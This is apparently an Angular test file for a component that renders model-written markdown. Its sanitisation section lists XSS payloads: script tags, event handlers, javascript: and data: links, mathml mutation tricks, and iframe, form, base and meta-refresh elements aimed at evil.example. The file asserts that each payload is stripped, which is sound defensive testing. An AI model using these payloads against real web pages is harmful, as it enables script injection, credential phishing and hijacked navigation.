import { ComponentFixture, TestBed } from '@angular/core/testing';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import { HyperionMarkdownComponent } from 'app/hyperion/exercise-generation/artifacts/hyperion-markdown.component';
import { htmlForMarkdown } from 'app/foundation/util/markdown.conversion.util';

/**
 * The content this component renders is whatever a large language model decided to write into SPEC.md or the problem
 * statement, and it reaches the DOM through `[innerHTML]`. It is untrusted input in the ordinary security sense, so
 * the sanitisation is asserted here as an invariant of the rendered tree rather than as a property of any one payload.
 */
describe('HyperionMarkdownComponent', () => {
    let fixture: ComponentFixture<HyperionMarkdownComponent>;

    beforeEach(async () => {
        await TestBed.configureTestingModule({ imports: [HyperionMarkdownComponent] }).compileComponents();
        fixture = TestBed.createComponent(HyperionMarkdownComponent);
    });

    function render(markdown: string | undefined): HTMLElement {
        fixture.componentRef.setInput('markdown', markdown);
        fixture.detectChanges();
        return fixture.nativeElement as HTMLElement;
    }

    /** Every attribute of every rendered element, so an assertion cannot miss a vector by only checking the ones it thought of. */
    function allAttributes(host: HTMLElement): { element: string; name: string; value: string }[] {
        return [...host.querySelectorAll<HTMLElement>('*')].flatMap((element) =>
            [...element.attributes].map((attribute) => ({ element: element.tagName.toLowerCase(), name: attribute.name.toLowerCase(), value: attribute.value })),
        );
    }

    describe('rendering', () => {
        it('renders markdown as prose rather than as its own source text', () => {
            const host = render('# Loan periods\n\nWrite a class.');

            expect(host.querySelector('h1')?.textContent).toContain('Loan periods');
            expect(host.querySelector('p')?.textContent).toContain('Write a class.');
            expect(host.querySelector('pre')).toBeNull();
        });

        it('hands the rendered document to tum-ui-prose, which owns the typography', () => {
            const host = render('# Heading');

            const prose = host.querySelector('.tum-ui-prose');
            expect(prose).not.toBeNull();
            expect(prose!.getAttribute('data-slot')).toBe('prose');
            expect(prose!.querySelector('h1')).not.toBeNull();
        });

        it('makes the prose element the direct parent of every block, which is what its rhythm rules need', () => {
            // `.tum-ui-prose > * + *` and `.tum-ui-prose > * + h2` set the entire vertical rhythm. One wrapper element
            // between the class and the document silently removes the spacing from every heading, paragraph and list,
            // so the relationship is asserted rather than assumed.
            const prose = render('# Heading\n\nA paragraph.\n\n- item').querySelector('.tum-ui-prose')!;

            expect([...prose.children].map((child) => child.tagName)).toEqual(['H1', 'P', 'UL']);
        });

        it('passes the density through to the prose container', () => {
            fixture.componentRef.setInput('markdown', '# Heading');
            fixture.componentRef.setInput('density', 'compact');
            fixture.detectChanges();

            expect((fixture.nativeElement as HTMLElement).querySelector('.tum-ui-prose')?.getAttribute('data-density')).toBe('compact');
        });

        it('renders every block a generated document actually uses', () => {
            const host = render(
                ['## Rules', '', '- first', '- second', '', '1. one', '2. two', '', '| a | b |', '| --- | --- |', '| 1 | 2 |', '', '> quoted', '', '---'].join('\n'),
            );

            expect(host.querySelector('h2')?.textContent).toContain('Rules');
            expect(host.querySelectorAll('ul li')).toHaveLength(2);
            expect(host.querySelectorAll('ol li')).toHaveLength(2);
            expect(host.querySelectorAll('table th')).toHaveLength(2);
            expect(host.querySelectorAll('table td')).toHaveLength(2);
            expect(host.querySelector('blockquote')?.textContent).toContain('quoted');
            expect(host.querySelector('hr')).not.toBeNull();
        });

        it('renders inline code and a fenced block as code, not as paragraphs', () => {
            const host = render('Call `size()` first.\n\n```java\nint size() { return 0; }\n```\n');

            expect(host.querySelector('p code')?.textContent).toBe('size()');
            const fenced = host.querySelector('pre code');
            expect(fenced).not.toBeNull();
            expect(fenced!.textContent).toContain('int size()');
        });

        it('keeps an ordinary link and its text', () => {
            const host = render('See [the docs](https://docs.artemis.tum.de/page).');

            const link = host.querySelector('a');
            expect(link?.getAttribute('href')).toBe('https://docs.artemis.tum.de/page');
            expect(link?.textContent).toBe('the docs');
        });

        it('renders nothing at all for absent or empty markdown, leaving the empty state to the caller', () => {
            expect(render(undefined).querySelector('.tum-ui-prose')?.textContent?.trim()).toBe('');
            expect(render('').querySelector('.tum-ui-prose')?.textContent?.trim()).toBe('');
        });

        it('re-renders when the source document changes', () => {
            render('# First');
            expect((fixture.nativeElement as HTMLElement).querySelector('h1')?.textContent).toContain('First');

            const host = render('# Second');
            expect(host.querySelector('h1')?.textContent).toContain('Second');
            expect(host.textContent).not.toContain('First');
        });
    });

    describe('sanitisation of untrusted model output', () => {
        /**
         * markdown-it runs with `html: true`, so raw HTML in the source is passed straight through to the sanitiser.
         * These payloads therefore reach DOMPurify exactly as written, which is what makes the assertions meaningful.
         */
        const PAYLOADS: [name: string, markdown: string][] = [
            ['a script element', '<script>window.__xss = true;</script>'],
            ['a script element after prose', 'Normal text.\n\n<script>window.__xss = true;</script>'],
            ['an image error handler', '<img src="x" onerror="window.__xss = true">'],
            ['an svg load handler', '<svg onload="window.__xss = true"></svg>'],
            ['a body-style event handler on a plain element', '<div onclick="window.__xss = true">click</div>'],
            ['a javascript: link written as markdown', '[click](javascript:window.__xss=true)'],
            ['a javascript: link written as HTML', '<a href="javascript:window.__xss=true">click</a>'],
            ['a data: URI link', '<a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3M9dHJ1ZTwvc2NyaXB0Pg==">click</a>'],
            ['an iframe', '<iframe src="https://evil.example/"></iframe>'],
            ['an object element', '<object data="https://evil.example/"></object>'],
            ['an embed element', '<embed src="https://evil.example/">'],
            ['a form that posts elsewhere', '<form action="https://evil.example/"><input name="a"><button>go</button></form>'],
            ['a style element', '<style>body { display: none }</style>'],
            ['a base element that would rewrite every relative link', '<base href="https://evil.example/">'],
            ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'],
            ['an animated svg link', '<svg><a xlink:href="javascript:window.__xss=true"><text>x</text></a></svg>'],
            ['a mutation payload nested in mathml', '<math><mtext><table><mglyph><style><img src=x onerror="window.__xss=true">'],
            ['a case-varied handler', '<img src="x" OnErRoR="window.__xss = true">'],
            ['a handler smuggled through a fenced block’s language', '```<img src=x onerror="window.__xss=true">\ncode\n```'],
        ];

        it.each(PAYLOADS)('strips %s', (_name, markdown) => {
            const host = render(markdown);

            expect(host.querySelector('script')).toBeNull();
            expect(host.querySelector('iframe')).toBeNull();
            expect(host.querySelector('object')).toBeNull();
            expect(host.querySelector('embed')).toBeNull();
            expect(host.querySelector('base')).toBeNull();
            expect(host.querySelector('meta')).toBeNull();
            expect(host.querySelector('form')).toBeNull();

            for (const attribute of allAttributes(host)) {
                expect(attribute.name.startsWith('on'), `${attribute.element}[${attribute.name}] survived`).toBe(false);
                if (attribute.name === 'href' || attribute.name === 'src' || attribute.name === 'xlink:href' || attribute.name === 'action') {
                    expect(attribute.value.replace(/\s/g, '').toLowerCase()).not.toContain('javascript:');
                }
            }
        });

        it.each(PAYLOADS)('never executes %s', (_name, markdown) => {
            const flagged = window as unknown as { __xss?: boolean };
            delete flagged.__xss;

            const host = render(markdown);
            // Anything that only fires on interaction still must not be reachable, so the payload is also clicked.
            // SVG elements have no `click()` in this environment, hence the guard rather than a blind call.
            host.querySelectorAll<HTMLElement>('*').forEach((element) => typeof element.click === 'function' && element.click());

            expect(flagged.__xss).toBeUndefined();
        });

        it('strips the form controls the shared sanitiser would otherwise permit, keeping their text', () => {
            // Verified against `htmlForMarkdown()` directly: DOMPurify's default profile permits these, which for a
            // human-authored post is defensible and for a document a model wrote is a credential prompt.
            expect(htmlForMarkdown('<form action="https://evil.example/"><input name="password"><button>Sign in</button></form>')).toContain('<form');

            const host = render('<form action="https://evil.example/"><input name="password"><button>Sign in</button></form>');

            expect(host.querySelector('form')).toBeNull();
            expect(host.querySelector('input')).toBeNull();
            expect(host.querySelector('button')).toBeNull();
            expect(host.textContent).toContain('Sign in');
        });

        it('bounds a fixed-position overlay to the component instead of the viewport', () => {
            // Inline `style` has to survive - KaTeX depends on it - so the containment is structural: the rendered
            // document sits in an element with a transform, which is a containing block for fixed descendants.
            const host = render('<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>');

            expect(host.querySelector('.hyperion-markdown-body')).not.toBeNull();
            expect(getComputedStyle(host.querySelector('.hyperion-markdown-body')!).transform).not.toBe('');
        });

        it('keeps the visible text of a stripped element instead of dropping the sentence with it', () => {
            const host = render('Before.\n\n<div onclick="window.__xss = true">the words survive</div>\n\nAfter.');

            expect(host.textContent).toContain('the words survive');
            expect(host.textContent).toContain('Before.');
            expect(host.textContent).toContain('After.');
        });

        it('escapes an attack written inside a fenced block rather than rendering it', () => {
            const host = render('```html\n<script>window.__xss = true;</script>\n```\n');

            expect(host.querySelector('script')).toBeNull();
            expect(host.querySelector('pre')?.textContent).toContain('<script>');
        });

        it('sanitises before Angular is asked to trust the string, so nothing dangerous is ever marked safe', () => {
            // The first pass. `SafeHtmlPipe` runs DOMPurify a second time on whatever this returned; asserting the
            // first pass here is what shows the component is safe on its own terms rather than only via the pipe.
            const sanitised = htmlForMarkdown('<img src="x" onerror="window.__xss = true"><script>window.__xss = true;</script>');

            expect(sanitised).not.toContain('onerror');
            expect(sanitised.toLowerCase()).not.toContain('<script');
        });

        it('does not warn about unsafe values, which would mean Angular had to strip something itself', () => {
            const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);

            render('<img src="x" onerror="window.__xss = true">');

            expect(warn).not.toHaveBeenCalledWith(expect.stringContaining('sanitizing'));
            warn.mockRestore();
        });
    });
});
